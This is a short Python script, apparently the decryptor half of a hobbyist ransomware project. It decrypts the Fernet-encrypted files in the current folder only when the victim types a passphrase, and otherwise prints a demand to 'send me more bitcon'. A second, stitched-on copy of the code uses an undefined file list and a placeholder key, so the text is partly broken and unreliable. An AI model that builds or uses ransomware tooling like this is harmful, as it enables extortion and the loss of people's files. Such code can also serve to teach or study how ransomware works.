#!/usr/bin/env python3

import os 

from cryptography.fernet import Fernet 

#let's find some files 

files = []

for file in os.listdir():
         if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
                continue
         if os.path.isfile(file):
                 files.append(file)

print(files)

key = Fernet.generate_key()

with open("thekey.key", "rb") as key:
         secretkey = key.read()

secretphrase = "coffee"

user_phrase = input("Enter the secret key to decrypt your files\n")

if user_phrase == secretphrase:
    
    for file in files:
            with open(file, "rb") as thefile:
                    contents = thefile.read()
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as thefile:
                    thefile.write(contents_decrypted)
            print("congrats, your files are decrpted Enjoy your coffee")
else:
        print("sorry, wrong secret phrase. send me more bitcon")


from pathlib import Path
from cryptography.fernet import Fernet

secretphrase = "coffee"
# secret_key must be the same Fernet key (bytes) used to encrypt the files:
# secret_key = b"...your-fernet-key-bytes..."
secret_key = b"...REPLACE_WITH_YOUR_KEY_BYTES..."

user_phrase = input("Enter the secret key to decrypt your files\n")

if user_phrase == secretphrase:
    for file in files:
        p = Path(file)
        if not p.is_file():
            print(f"skipping (not a file): {p}")
            continue

        try:
            contents = p.read_bytes()
            contents_decrypted = Fernet(secret_key).decrypt(contents)
            p.write_bytes(contents_decrypted)
            print(f"congrats, your files are decrypted — enjoy your coffee: {p}")
        except Exception as e:
            print(f"error decrypting {p}: {e}")
else:
    print("sorry, wrong secret phrase. send me more bitcoin")

   

